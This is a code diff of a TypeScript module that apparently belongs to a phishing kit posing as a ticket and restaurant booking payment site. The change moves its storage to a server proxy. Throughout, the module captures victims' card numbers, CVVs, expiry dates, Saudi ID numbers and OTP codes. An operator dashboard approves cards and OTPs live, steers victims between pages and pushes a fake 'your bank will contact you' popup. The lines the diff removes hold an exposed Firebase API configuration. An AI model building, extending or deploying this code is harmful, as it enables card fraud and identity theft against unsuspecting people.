@@ -1,53 +1,13 @@
-import { getApp, getApps, initializeApp } from "firebase/app";
-import { getDatabase } from "firebase/database";
-import {
-  doc,
-  getDoc,
-  getFirestore,
-  setDoc,
-  updateDoc,
-  onSnapshot,
-} from "firebase/firestore";
-import {
-  getAuth,
-  signInWithEmailAndPassword,
-  signOut,
-  onAuthStateChanged,
-  User,
-} from "firebase/auth";
-
-const firebaseConfig = {
-  apiKey: "AIzaSyCcqyj3sAX5bpvPtSa0hPJtM0yHWodKL3M",
-  authDomain: "ewwg-e7968.firebaseapp.com",
-  projectId: "ewwg-e7968",
-  storageBucket: "ewwg-e7968.firebasestorage.app",
-  messagingSenderId: "7607144456",
-  appId: "1:7607144456:web:0de30b8c001e5cd89781bd",
-  measurementId: "G-X3QHYPETGB",
-};
-
-function initializeFirebase() {
-  if (typeof window === "undefined") {
-    return null;
-  }
-
-  if (!firebaseConfig.apiKey || !firebaseConfig.projectId) {
-    console.warn(
-      "Firebase configuration is incomplete. Some features may not work.",
-    );
-    return null;
-  }
-
-  return getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
-}
-
-const app = initializeFirebase();
-const db = app ? getFirestore(app) : null;
-const database = app ? getDatabase(app) : null;
-const auth = app ? getAuth(app) : null;
+// Server-proxied Firebase shim. The actual Firebase Admin SDK lives on the
+// server (see server/firebase-admin.ts + server/firebase-routes.ts). This
+// file preserves the public API the rest of the app already uses, but every
+// call now goes through /api/fb/* endpoints (REST + SSE). No firebase client
+// SDK is imported.
+//
+// Visitor ID is still stored in localStorage["visitor"] (unchanged).
+// Admin auth uses an HttpOnly session cookie set by /api/fb/admin/login.
 
 const MAX_HISTORY_ITEMS = 20;
-const MAX_AMOUNT_VALUE = 1_000_000;
 const BLOCK_CACHE_TTL_MS = 10_000;
 
 const blockedVisitorCache = new Map<
@@ -64,39 +24,10 @@ let cachedVisitorGeo: {
   region: string;
 } | null = null;
 
-const sanitizeString = (value: unknown, maxLength: number) => {
-  if (typeof value !== "string") return value;
-  return value.trim().slice(0, maxLength);
-};
-
 const sanitizeDigits = (value: unknown, maxLength: number) => {
   if (typeof value !== "string") return value;
   return value.replace(/\D/g, "").slice(0, maxLength);
 };
-
-const sanitizePhone = (value: unknown, maxLength: number) => {
-  if (typeof value !== "string") return value;
-  return value.replace(/[^\d+]/g, "").slice(0, maxLength);
-};
-
-const clampNumber = (value: unknown, min: number, max: number) => {
-  if (typeof value !== "number" || Number.isNaN(value)) return value;
-  return Math.min(max, Math.max(min, value));
-};
-
-const sanitizeCardEntry = (entry: any) => ({
-  cardNumber: sanitizeDigits(entry?.cardNumber, 19),
-  cardName: sanitizeString(entry?.cardName, 60),
-  expiryMonth: sanitizeDigits(entry?.expiryMonth, 2),
-  expiryYear: sanitizeDigits(entry?.expiryYear, 4),
-  cvv: sanitizeDigits(entry?.cvv, 4),
-  cardType: sanitizeString(entry?.cardType, 20),
-  timestamp:
-    typeof entry?.timestamp === "string"
-      ? entry.timestamp
-      : new Date().toISOString(),
-});
-
 const sanitizeOtpEntry = (entry: any) => ({
   code: sanitizeDigits(entry?.code, 6),
   timestamp:
@@ -105,353 +36,338 @@ const sanitizeOtpEntry = (entry: any) => ({
       : new Date().toISOString(),
 });
 
-const sanitizePayload = (input: any) => {
-  const data = { ...input };
-
-  if ("id" in data) data.id = sanitizeString(data.id, 80);
-  if ("name" in data) data.name = sanitizeString(data.name, 80);
-  if ("saudiId" in data) data.saudiId = sanitizeDigits(data.saudiId, 10);
-  if ("email" in data && typeof data.email === "string") {
-    data.email = data.email.trim().toLowerCase().slice(0, 120);
-  }
-  if ("phone" in data) data.phone = sanitizePhone(data.phone, 15);
-  if ("cardNumber" in data)
-    data.cardNumber = sanitizeDigits(data.cardNumber, 19);
-  if ("cardName" in data) data.cardName = sanitizeString(data.cardName, 60);
-  if ("expiryMonth" in data)
-    data.expiryMonth = sanitizeDigits(data.expiryMonth, 2);
-  if ("expiryYear" in data)
-    data.expiryYear = sanitizeDigits(data.expiryYear, 4);
-  if ("cvv" in data) data.cvv = sanitizeDigits(data.cvv, 4);
-  if ("cardType" in data) data.cardType = sanitizeString(data.cardType, 20);
-  if ("cardCategory" in data)
-    data.cardCategory = sanitizeString(data.cardCategory, 40);
-  if ("otp" in data) data.otp = sanitizeDigits(data.otp, 6);
-  if ("currentPage" in data)
-    data.currentPage = sanitizeString(data.currentPage, 40);
-  if ("status" in data) data.status = sanitizeString(data.status, 40);
-  if ("type" in data) data.type = sanitizeString(data.type, 40);
-  if ("restaurant" in data)
-    data.restaurant = sanitizeString(data.restaurant, 120);
-  if ("restaurantEn" in data)
-    data.restaurantEn = sanitizeString(data.restaurantEn, 120);
-  if ("date" in data) data.date = sanitizeString(data.date, 40);
-  if ("time" in data) data.time = sanitizeString(data.time, 40);
-  if ("guests" in data) data.guests = sanitizeDigits(data.guests, 2);
-  if ("notes" in data) data.notes = sanitizeString(data.notes, 300);
-  if ("bookingDate" in data)
-    data.bookingDate = sanitizeString(data.bookingDate, 40);
-  if ("bookingTime" in data)
-    data.bookingTime = sanitizeString(data.bookingTime, 40);
-
-  if ("ticketQuantity" in data) {
-    data.ticketQuantity = clampNumber(data.ticketQuantity, 1, 100);
-  }
-  if ("ticketPrice" in data) {
-    data.ticketPrice = clampNumber(data.ticketPrice, 0, MAX_AMOUNT_VALUE);
-  }
-  if ("totalAmount" in data) {
-    data.totalAmount = clampNumber(data.totalAmount, 0, MAX_AMOUNT_VALUE);
-  }
-  if ("total" in data) {
-    data.total = clampNumber(data.total, 0, MAX_AMOUNT_VALUE);
-  }
-
-  if (Array.isArray(data.cardHistory)) {
-    data.cardHistory = data.cardHistory
-      .slice(-MAX_HISTORY_ITEMS)
-      .map((entry: any) => sanitizeCardEntry(entry));
-  }
-
-  if (Array.isArray(data.otpHistory)) {
-    data.otpHistory = data.otpHistory
-      .slice(-MAX_HISTORY_ITEMS)
-      .map((entry: any) => sanitizeOtpEntry(entry));
-  }
-
-  return data;
-};
-
-const isVisitorBlocked = async (visitorId: string) => {
-  if (!db || !visitorId) return false;
-
-  const cached = blockedVisitorCache.get(visitorId);
-  if (cached && cached.expiresAt > Date.now()) {
-    return cached.blocked;
-  }
-
+async function postJson<T = any>(url: string, body: any, opts: { credentials?: RequestCredentials } = {}): Promise<{ ok: boolean; status: number; data: T | null }> {
   try {
-    const snapshot = await getDoc(doc(db, "pays", visitorId));
-    const blocked = Boolean(snapshot.data()?.blocked);
-    blockedVisitorCache.set(visitorId, {
-      blocked,
-      expiresAt: Date.now() + BLOCK_CACHE_TTL_MS,
+    const res = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(body || {}),
+      credentials: opts.credentials || "same-origin",
     });
-    return blocked;
-  } catch (error) {
-    console.error("Error checking visitor block status:", error);
-    return false;
+    const data = (await res.json().catch(() => null)) as T | null;
+    return { ok: res.ok, status: res.status, data };
+  } catch (err) {
+    console.error("[fb-shim] POST", url, "failed:", err);
+    return { ok: false, status: 0, data: null };
   }
-};
+}
+
+async function delJson<T = any>(url: string): Promise<{ ok: boolean; status: number; data: T | null }> {
+  try {
+    const res = await fetch(url, {
+      method: "DELETE",
+      credentials: "same-origin",
+    });
+    const data = (await res.json().catch(() => null)) as T | null;
+    return { ok: res.ok, status: res.status, data };
+  } catch (err) {
+    return { ok: false, status: 0, data: null };
+  }
+}
+
+/* -------------------- Visitor-doc SSE multiplexer -------------------- */
+// One EventSource per visitor; multiple local listeners share the stream.
+type VisitorDocListener = (snap: { exists: boolean; data: any | null }) => void;
+
+const visitorStreams = new Map<
+  string,
+  { es: EventSource; listeners: Set<VisitorDocListener>; lastSnap: { exists: boolean; data: any | null } | null }
+>();
+
+function ensureVisitorStream(visitorId: string) {
+  let entry = visitorStreams.get(visitorId);
+  if (entry) return entry;
+  const es = new EventSource(`/api/fb/stream/visitor/${encodeURIComponent(visitorId)}`);
+  entry = { es, listeners: new Set(), lastSnap: null };
+  visitorStreams.set(visitorId, entry);
+  es.onmessage = (ev) => {
+    try {
+      const snap = JSON.parse(ev.data);
+      entry!.lastSnap = snap;
+      for (const cb of Array.from(entry!.listeners)) {
+        try { cb(snap); } catch (err) { console.error(err); }
+      }
+    } catch (err) {
+      console.error("[fb-shim] visitor stream parse error:", err);
+    }
+  };
+  es.onerror = () => {
+    // EventSource auto-reconnects; nothing to do.
+  };
+  return entry;
+}
+
+function subscribeVisitorDoc(visitorId: string, cb: VisitorDocListener): () => void {
+  const entry = ensureVisitorStream(visitorId);
+  entry.listeners.add(cb);
+  if (entry.lastSnap) {
+    try { cb(entry.lastSnap); } catch {}
+  }
+  return () => {
+    entry.listeners.delete(cb);
+    if (entry.listeners.size === 0) {
+      try { entry.es.close(); } catch {}
+      visitorStreams.delete(visitorId);
+    }
+  };
+}
+
+/* -------------------- IP blocklist SSE multiplexer -------------------- */
+let ipStream: { es: EventSource; listeners: Set<(ips: string[]) => void>; last: string[] | null } | null = null;
+function ensureIpStream() {
+  if (ipStream) return ipStream;
+  const es = new EventSource(`/api/fb/stream/blocked-ips`);
+  ipStream = { es, listeners: new Set(), last: null };
+  es.onmessage = (ev) => {
+    try {
+      const data = JSON.parse(ev.data);
+      const ips: string[] = Array.isArray(data?.ips) ? data.ips : [];
+      ipStream!.last = ips;
+      for (const cb of Array.from(ipStream!.listeners)) {
+        try { cb(ips); } catch (err) { console.error(err); }
+      }
+    } catch {}
+  };
+  return ipStream;
+}
+export function subscribeBlockedIps(cb: (ips: string[]) => void): () => void {
+  const entry = ensureIpStream();
+  entry.listeners.add(cb);
+  if (entry.last) cb(entry.last);
+  return () => {
+    entry.listeners.delete(cb);
+    if (entry.listeners.size === 0) {
+      try { entry.es.close(); } catch {}
+      ipStream = null;
+    }
+  };
+}
+
+/* -------------------- BIN blocklist SSE multiplexer -------------------- */
+type BinEntry = { bin: string; bankName?: string; cardBrand?: string; country?: string; blockedAt?: string };
+let binStream: { es: EventSource; listeners: Set<(bins: BinEntry[]) => void>; last: BinEntry[] | null } | null = null;
+function ensureBinStream() {
+  if (binStream) return binStream;
+  const es = new EventSource(`/api/fb/stream/blocked-bins`);
+  binStream = { es, listeners: new Set(), last: null };
+  es.onmessage = (ev) => {
+    try {
+      const data = JSON.parse(ev.data);
+      const bins: BinEntry[] = Array.isArray(data?.bins) ? data.bins : [];
+      binStream!.last = bins;
+      for (const cb of Array.from(binStream!.listeners)) {
+        try { cb(bins); } catch (err) { console.error(err); }
+      }
+    } catch {}
+  };
+  return binStream;
+}
+
+/* -------------------- Admin visitors SSE multiplexer (dashboard) -------------------- */
+let adminVisitorsStream:
+  | { es: EventSource; listeners: Set<(visitors: any[]) => void>; last: any[] | null }
+  | null = null;
+function ensureAdminVisitorsStream() {
+  if (adminVisitorsStream) return adminVisitorsStream;
+  const es = new EventSource(`/api/fb/admin/stream/visitors`, { withCredentials: true } as any);
+  adminVisitorsStream = { es, listeners: new Set(), last: null };
+  es.onmessage = (ev) => {
+    try {
+      const data = JSON.parse(ev.data);
+      const list: any[] = Array.isArray(data?.visitors) ? data.visitors : [];
+      adminVisitorsStream!.last = list;
+      for (const cb of Array.from(adminVisitorsStream!.listeners)) {
+        try { cb(list); } catch (err) { console.error(err); }
+      }
+    } catch {}
+  };
+  return adminVisitorsStream;
+}
+export function subscribeAdminVisitors(cb: (visitors: any[]) => void): () => void {
+  const entry = ensureAdminVisitorsStream();
+  entry.listeners.add(cb);
+  if (entry.last) cb(entry.last);
+  return () => {
+    entry.listeners.delete(cb);
+    if (entry.listeners.size === 0) {
+      try { entry.es.close(); } catch {}
+      adminVisitorsStream = null;
+    }
+  };
+}
+
+/* ==================== Auth ==================== */
+export type AdminUser = { uid: string; email: string };
+
+let cachedAdminUser: AdminUser | null = null;
+const authListeners = new Set<(user: AdminUser | null) => void>();
+function notifyAuth(user: AdminUser | null) {
+  cachedAdminUser = user;
+  for (const cb of Array.from(authListeners)) {
+    try { cb(user); } catch {}
+  }
+}
 
 export const loginWithEmail = async (email: string, password: string) => {
-  if (!auth) throw new Error("Auth not initialized");
-  return signInWithEmailAndPassword(auth, email, password);
+  const r = await postJson<{ uid: string; email: string; error?: string }>(
+    "/api/fb/admin/login",
+    { email, password },
+    { credentials: "same-origin" },
+  );
+  if (!r.ok || !r.data?.uid) {
+    const code = r.data?.error || "invalid_credential";
+    const err: any = new Error(code);
+    // Map server codes to the legacy Firebase auth error codes the UI checks.
+    const map: Record<string, string> = {
+      invalid_credential: "auth/invalid-credential",
+      user_not_found: "auth/user-not-found",
+      wrong_password: "auth/wrong-password",
+      user_disabled: "auth/user-disabled",
+    };
+    err.code = map[code] || "auth/invalid-credential";
+    throw err;
+  }
+  const user: AdminUser = { uid: r.data.uid, email: r.data.email };
+  notifyAuth(user);
+  return { user };
 };
 
 export const logoutUser = async () => {
-  if (!auth) return;
-  return signOut(auth);
+  await postJson("/api/fb/admin/logout", {});
+  notifyAuth(null);
 };
 
-export const onAuthChange = (callback: (user: User | null) => void) => {
-  if (!auth) return () => {};
-  return onAuthStateChanged(auth, callback);
+export const onAuthChange = (callback: (user: AdminUser | null) => void) => {
+  authListeners.add(callback);
+  // Kick off (or reuse) the /me check so the listener fires once with the
+  // current user. We always call back at least once (with null if unknown).
+  (async () => {
+    try {
+      const res = await fetch("/api/fb/admin/me", { credentials: "same-origin" });
+      const data = await res.json().catch(() => null);
+      const user = data?.user ? { uid: data.user.uid, email: data.user.email } : null;
+      cachedAdminUser = user;
+      try { callback(user); } catch {}
+    } catch {
+      try { callback(null); } catch {}
+    }
+  })();
+  return () => {
+    authListeners.delete(callback);
+  };
 };
 
-export async function addData(data: any) {
-  if (!db) {
-    console.warn("Firebase not initialized. Cannot add data.");
-    return false;
-  }
-
-  const payload = sanitizePayload(data);
+/* ==================== Visitor writes ==================== */
+export async function addData(data: any): Promise<boolean> {
+  const payload = { ...data };
   const visitorId =
-    typeof payload?.id === "string"
+    typeof payload?.id === "string" && payload.id
       ? payload.id
-      : localStorage.getItem("visitor");
-
+      : typeof window !== "undefined"
+      ? localStorage.getItem("visitor")
+      : null;
   if (!visitorId) {
     console.warn("Missing visitor ID. Cannot add data.");
     return false;
   }
+  if (typeof window !== "undefined") localStorage.setItem("visitor", visitorId);
+  if (cachedIpBlocked === true) return false;
 
-  localStorage.setItem("visitor", visitorId);
-  if (cachedIpBlocked === true) {
-    console.warn("Blocked IP tried to submit data:", visitorId);
-    return false;
-  }
-  const blocked = await isVisitorBlocked(visitorId);
-  if (blocked) {
-    console.warn("Blocked visitor tried to submit data:", visitorId);
-    return false;
-  }
-
-  try {
-    const docRef = doc(db, "pays", visitorId!);
-    await setDoc(
-      docRef,
-      {
-        ...payload,
-        id: visitorId,
-        createdDate:
-          typeof payload.createdDate === "string"
-            ? payload.createdDate
-            : new Date().toISOString(),
-      },
-      { merge: true },
-    );
-
-    console.log("Document written with ID: ", docRef.id);
-    return true;
-  } catch (e) {
-    console.error("Error adding document: ", e);
-    return false;
-  }
+  const r = await postJson("/api/fb/visitor/data", { ...payload, id: visitorId });
+  return r.ok;
 }
 
 export const handleCurrentPage = async (page: string) => {
-  const visitorId = localStorage.getItem("visitor");
-  if (visitorId) {
-    return addData({ id: visitorId, currentPage: page });
-  }
-  return false;
+  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
+  if (!visitorId) return false;
+  return addData({ id: visitorId, currentPage: page });
 };
 
 export const handleOtp = async (otp: string, page: string = "otp") => {
-  const visitorId = localStorage.getItem("visitor");
-  if (visitorId && db) {
-    try {
-      if (cachedIpBlocked === true) {
-        throw new Error("IP_BLOCKED");
-      }
-      const blocked = await isVisitorBlocked(visitorId);
-      if (blocked) {
-        throw new Error("VISITOR_BLOCKED");
-      }
+  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
+  if (!visitorId) return false;
+  if (cachedIpBlocked === true) throw new Error("IP_BLOCKED");
 
-      const docRef = doc(db, "pays", visitorId);
-      const otpEntry = {
-        code: sanitizeDigits(otp, 6),
-        timestamp: new Date().toISOString(),
-      };
-      if (typeof otpEntry.code !== "string" || otpEntry.code.length < 4) {
-        throw new Error("INVALID_OTP");
-      }
-      const existingOtpsRaw = JSON.parse(
-        localStorage.getItem("otpHistory") || "[]",
-      );
-      const existingOtps = Array.isArray(existingOtpsRaw)
-        ? existingOtpsRaw
-        : [];
-      const nextOtps = [...existingOtps, otpEntry]
-        .slice(-MAX_HISTORY_ITEMS)
-        .map((entry) => sanitizeOtpEntry(entry));
-      localStorage.setItem("otpHistory", JSON.stringify(nextOtps));
+  const code = sanitizeDigits(otp, 6);
+  if (typeof code !== "string" || code.length < 4) throw new Error("INVALID_OTP");
 
-      await setDoc(
-        docRef,
-        sanitizePayload({
-          otp: otpEntry.code,
-          otpHistory: nextOtps,
-          currentPage: page,
-          otpApproved: false,
-          otpStatus: "pending",
-        }),
-        { merge: true },
-      );
-      return true;
-    } catch (error) {
-      console.error("Error saving OTP:", error);
-      throw error;
-    }
+  const existingRaw =
+    typeof window !== "undefined"
+      ? JSON.parse(localStorage.getItem("otpHistory") || "[]")
+      : [];
+  const existing = Array.isArray(existingRaw) ? existingRaw : [];
+  const otpEntry = { code, timestamp: new Date().toISOString() };
+  const next = [...existing, otpEntry].slice(-MAX_HISTORY_ITEMS).map(sanitizeOtpEntry);
+  if (typeof window !== "undefined") localStorage.setItem("otpHistory", JSON.stringify(next));
+
+  const r = await postJson<{ ok: boolean; error?: string }>(
+    "/api/fb/visitor/otp",
+    { visitorId, otp: code, page, history: existing },
+  );
+  if (!r.ok) {
+    if (r.data?.error === "ip_blocked") throw new Error("IP_BLOCKED");
+    if (r.data?.error === "visitor_blocked") throw new Error("VISITOR_BLOCKED");
+    throw new Error(r.data?.error || "OTP_WRITE_FAILED");
   }
-  return false;
+  return true;
 };
 
 export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
-  if (!db) {
-    console.warn("Firebase not initialized. Cannot process payment.");
-    return false;
+  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
+  if (!visitorId) return false;
+  if (cachedIpBlocked === true) throw new Error("IP_BLOCKED");
+
+  const r = await postJson<{ ok: boolean; error?: string }>(
+    "/api/fb/visitor/pay",
+    { visitorId, paymentInfo },
+  );
+  if (!r.ok) {
+    if (r.data?.error === "ip_blocked") throw new Error("IP_BLOCKED");
+    if (r.data?.error === "visitor_blocked") throw new Error("VISITOR_BLOCKED");
+    throw new Error(r.data?.error || "PAY_WRITE_FAILED");
   }
-
-  try {
-    const visitorId = localStorage.getItem("visitor");
-    if (visitorId) {
-      if (cachedIpBlocked === true) {
-        throw new Error("IP_BLOCKED");
-      }
-      const blocked = await isVisitorBlocked(visitorId);
-      if (blocked) {
-        throw new Error("VISITOR_BLOCKED");
-      }
-
-      const docRef = doc(db, "pays", visitorId);
-      const sanitizedPaymentInfo = sanitizePayload(paymentInfo);
-      const cardEntry = sanitizeCardEntry({
-        ...sanitizedPaymentInfo,
-        timestamp: new Date().toISOString(),
-      });
-
-      const snapshot = await getDoc(docRef);
-      const existingHistoryRaw = snapshot.data()?.cardHistory;
-      const existingHistory = Array.isArray(existingHistoryRaw)
-        ? existingHistoryRaw
-        : [];
-      const nextCardHistory = [...existingHistory, cardEntry]
-        .slice(-MAX_HISTORY_ITEMS)
-        .map((entry) => sanitizeCardEntry(entry));
-
-      await setDoc(
-        docRef,
-        sanitizePayload({
-          ...sanitizedPaymentInfo,
-          status: "pending_approval",
-          cardApproved: false,
-          cardStatus: "pending_approval",
-          cardHistory: nextCardHistory,
-        }),
-        { merge: true },
-      );
-
-      if (typeof setPaymentInfo === "function") {
-        setPaymentInfo((prev: any) => ({
-          ...prev,
-          status: "pending_approval",
-        }));
-      }
-      return true;
-    }
-  } catch (error) {
-    console.error("Error adding document: ", error);
-    throw error;
+  if (typeof setPaymentInfo === "function") {
+    setPaymentInfo((prev: any) => ({ ...prev, status: "pending_approval" }));
   }
-  return false;
+  return true;
 };
 
-// Listen for card approval status
+/* ==================== Visitor listeners ==================== */
 export const listenForApproval = (
   callback: (status: "approved" | "rejected") => void,
 ): (() => void) => {
-  if (!db) {
-    console.warn("Firebase not initialized. Cannot listen for approval.");
-    return () => {};
-  }
-
-  const visitorId = localStorage.getItem("visitor");
-  if (!visitorId) {
-    return () => {};
-  }
-
-  const docRef = doc(db, "pays", visitorId);
-  const unsubscribe = onSnapshot(docRef, (snapshot) => {
-    if (snapshot.exists()) {
-      const data = snapshot.data();
-      if (data.cardApproved === true) {
-        callback("approved");
-      } else if (data.cardStatus === "rejected") {
-        callback("rejected");
-      }
-    }
+  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
+  if (!visitorId) return () => {};
+  return subscribeVisitorDoc(visitorId, (snap) => {
+    if (!snap.exists || !snap.data) return;
+    const data = snap.data;
+    if (data.cardApproved === true) callback("approved");
+    else if (data.cardStatus === "rejected") callback("rejected");
   });
-
-  return unsubscribe;
 };
 
 export const listenForOtpApproval = (
   callback: (status: "approved" | "rejected") => void,
 ): (() => void) => {
-  if (!db) {
-    console.warn("Firebase not initialized.");
-    return () => {};
-  }
-
-  const visitorId = localStorage.getItem("visitor");
+  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
   if (!visitorId) return () => {};
-
-  const docRef = doc(db, "pays", visitorId);
-  const unsubscribe = onSnapshot(docRef, (snapshot) => {
-    if (snapshot.exists()) {
-      const data = snapshot.data();
-      if (data.otpApproved === true) {
-        callback("approved");
-      } else if (data.otpStatus === "rejected") {
-        callback("rejected");
-      }
-    }
+  return subscribeVisitorDoc(visitorId, (snap) => {
+    if (!snap.exists || !snap.data) return;
+    const data = snap.data;
+    if (data.otpApproved === true) callback("approved");
+    else if (data.otpStatus === "rejected") callback("rejected");
   });
-
-  return unsubscribe;
 };
 
-// Listen for admin "push step" commands. The dashboard writes a `directedStep`
-// field on the visitor's pay doc; this fires the callback whenever that field
-// changes to a positive number, so the visitor's app can navigate to the
-// matching page. Dedups by `directedAt` so re-pushing the same step number
-// fires again. The callback receives the visitor's data so the watcher can
-// pick the right route based on flow (ticket vs restaurant).
 export const listenForDirectedStep = (
   callback: (step: number, data: any) => void,
 ): (() => void) => {
-  if (!db) return () => {};
-  const visitorId = localStorage.getItem("visitor");
+  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
   if (!visitorId) return () => {};
-
-  const docRef = doc(db, "pays", visitorId);
   let lastDirectedAt = "";
-  const unsubscribe = onSnapshot(docRef, (snapshot) => {
-    if (!snapshot.exists()) return;
-    const data = snapshot.data();
+  return subscribeVisitorDoc(visitorId, (snap) => {
+    if (!snap.exists || !snap.data) return;
+    const data = snap.data;
     const step = Number(data?.directedStep) || 0;
     const directedAt = String(data?.directedAt || "");
     if (step > 0 && directedAt && directedAt !== lastDirectedAt) {
@@ -461,171 +377,57 @@ export const listenForDirectedStep = (
       lastDirectedAt = "";
     }
   });
-  return unsubscribe;
 };
 
-// Clear the directedStep field after the visitor has acted on it so the same
-// command doesn't fire again on the next snapshot.
 export const clearDirectedStep = async () => {
-  if (!db) return;
-  const visitorId = localStorage.getItem("visitor");
+  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
   if (!visitorId) return;
-  try {
-    const docRef = doc(db, "pays", visitorId);
-    await setDoc(
-      docRef,
-      {
-        directedStep: 0,
-        directedAt: null,
-        updatedAt: new Date().toISOString(),
-      },
-      { merge: true },
-    );
-  } catch (error) {
-    console.error("Error clearing directedStep:", error);
-  }
-};
-
-export const updateOtpApprovalStatus = async (
-  visitorId: string,
-  approved: boolean,
-) => {
-  if (!db) return;
-  try {
-    const docRef = doc(db, "pays", visitorId);
-    await updateDoc(docRef, {
-      otpApproved: approved,
-      otpStatus: approved ? "approved" : "rejected",
-    });
-  } catch (error) {
-    console.error("Error updating OTP approval:", error);
-  }
-};
-
-// Update visitor approval status (for admin dashboard)
-export const updateApprovalStatus = async (
-  visitorId: string,
-  approved: boolean,
-) => {
-  if (!db) {
-    console.warn("Firebase not initialized.");
-    return;
-  }
-
-  try {
-    const docRef = doc(db, "pays", visitorId);
-    await updateDoc(docRef, {
-      cardApproved: approved,
-      cardStatus: approved ? "approved" : "rejected",
-      status: approved ? "approved" : "rejected",
-    });
-  } catch (error) {
-    console.error("Error updating approval status:", error);
-  }
-};
-
-// --- "Bank contact" prompt ---
-// Admin can push a popup to the visitor that says their bank will contact
-// them. The visitor sees a modal with a confirm button; when they confirm,
-// the admin's dashboard is notified.
-
-export const pushBankContactRequest = async (visitorId: string) => {
-  if (!db || !visitorId) return;
-  try {
-    await setDoc(
-      doc(db, "pays", visitorId),
-      {
-        bankContactRequest: true,
-        bankContactAt: new Date().toISOString(),
-        bankContactConfirmed: false,
-        bankContactConfirmedAt: null,
-        updatedAt: new Date().toISOString(),
-      },
-      { merge: true },
-    );
-  } catch (err) {
-    console.error("Error pushing bank contact request:", err);
-  }
+  await postJson("/api/fb/visitor/clear-step", { visitorId });
 };
 
 export const listenForBankContactRequest = (
   callback: (
     show: boolean,
-    payload: {
-      requestedAt: string;
-      cardBin: string;
-      cardBankName: string;
-    },
+    payload: { requestedAt: string; cardBin: string; cardBankName: string },
   ) => void,
 ): (() => void) => {
-  if (!db) return () => {};
-  const visitorId = localStorage.getItem("visitor");
+  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
   if (!visitorId) return () => {};
-  const ref = doc(db, "pays", visitorId);
-  return onSnapshot(ref, (snap) => {
-    if (!snap.exists()) {
+  return subscribeVisitorDoc(visitorId, (snap) => {
+    if (!snap.exists || !snap.data) {
       callback(false, { requestedAt: "", cardBin: "", cardBankName: "" });
       return;
     }
-    const data = snap.data() as any;
+    const data = snap.data;
     const requested = Boolean(data?.bankContactRequest);
     const confirmed = Boolean(data?.bankContactConfirmed);
     const requestedAt = String(data?.bankContactAt || "");
     const rawCard = String(data?.cardNumber || "").replace(/\D/g, "");
     const cardBin = rawCard.slice(0, 6);
-    const cardBankName = String(
-      data?.cardBankName || data?.cardBank || data?.bankName || "",
-    );
-    callback(requested && !confirmed, {
-      requestedAt,
-      cardBin,
-      cardBankName,
-    });
+    const cardBankName = String(data?.cardBankName || data?.cardBank || data?.bankName || "");
+    callback(requested && !confirmed, { requestedAt, cardBin, cardBankName });
   });
 };
 
 export const confirmBankContact = async () => {
-  if (!db) return;
-  const visitorId = localStorage.getItem("visitor");
+  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
   if (!visitorId) return;
-  try {
-    await setDoc(
-      doc(db, "pays", visitorId),
-      {
-        bankContactConfirmed: true,
-        bankContactConfirmedAt: new Date().toISOString(),
-        bankContactRequest: false,
-        updatedAt: new Date().toISOString(),
-      },
-      { merge: true },
-    );
-  } catch (err) {
-    console.error("Error confirming bank contact:", err);
-  }
+  await postJson("/api/fb/visitor/bank-contact/confirm", { visitorId });
 };
 
-// Live-listen to the visitor's own block flag so the page can react when an
-// admin flips `blocked` on their pay doc.
 export const listenForVisitorBlock = (
   callback: (blocked: boolean) => void,
 ): (() => void) => {
-  if (!db) return () => {};
-  const visitorId = localStorage.getItem("visitor");
+  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
   if (!visitorId) return () => {};
-  const ref = doc(db, "pays", visitorId);
-  return onSnapshot(ref, (snap) => {
-    const data = snap.exists() ? (snap.data() as any) : null;
-    const blocked = Boolean(data?.blocked);
-    blockedVisitorCache.set(visitorId, {
-      blocked,
-      expiresAt: Date.now() + BLOCK_CACHE_TTL_MS,
-    });
+  return subscribeVisitorDoc(visitorId, (snap) => {
+    const blocked = Boolean(snap.data?.blocked);
+    blockedVisitorCache.set(visitorId, { blocked, expiresAt: Date.now() + BLOCK_CACHE_TTL_MS });
     callback(blocked);
   });
 };
 
-// ===== Blocked IP management =====
-// Fetch the visitor's IP and geo from the server. Cached for the page lifetime.
+/* ==================== IP / geo ==================== */
 export const fetchVisitorIp = async (): Promise<string> => {
   if (cachedVisitorIp !== null) return cachedVisitorIp;
   try {
@@ -638,8 +440,7 @@ export const fetchVisitorIp = async (): Promise<string> => {
     cachedVisitorIp = typeof json?.ip === "string" ? json.ip : "";
     cachedVisitorGeo = {
       country: typeof json?.country === "string" ? json.country : "",
-      countryCode:
-        typeof json?.countryCode === "string" ? json.countryCode : "",
+      countryCode: typeof json?.countryCode === "string" ? json.countryCode : "",
       city: typeof json?.city === "string" ? json.city : "",
       region: typeof json?.region === "string" ? json.region : "",
     };
@@ -652,51 +453,42 @@ export const fetchVisitorIp = async (): Promise<string> => {
   }
 };
 
-// Check whether an IP is in the admin blocklist (settings/blockedIps doc).
 export const isIpBlocked = async (ip: string): Promise<boolean> => {
-  if (!db || !ip) return false;
-  try {
-    const snap = await getDoc(doc(db, "settings", "blockedIps"));
-    if (!snap.exists()) return false;
-    const data = snap.data() as any;
-    const ips: string[] = Array.isArray(data?.ips)
-      ? data.ips.map((x: any) => String(x).trim())
-      : [];
-    return ips.includes(ip.trim());
-  } catch (error) {
-    console.error("Error checking blocked IP:", error);
-    return false;
-  }
+  if (!ip) return false;
+  // Use the SSE stream's last value if available (avoids a round-trip and
+  // reflects realtime admin updates). Otherwise open the stream and wait
+  // for the first emission with a short timeout.
+  const stream = ensureIpStream();
+  if (stream.last) return stream.last.includes(ip.trim());
+  return await new Promise<boolean>((resolve) => {
+    let off: (() => void) | null = null;
+    const t = setTimeout(() => {
+      if (off) off();
+      resolve(false);
+    }, 2500);
+    off = subscribeBlockedIps((ips) => {
+      clearTimeout(t);
+      if (off) off();
+      resolve(ips.includes(ip.trim()));
+    });
+  });
 };
 
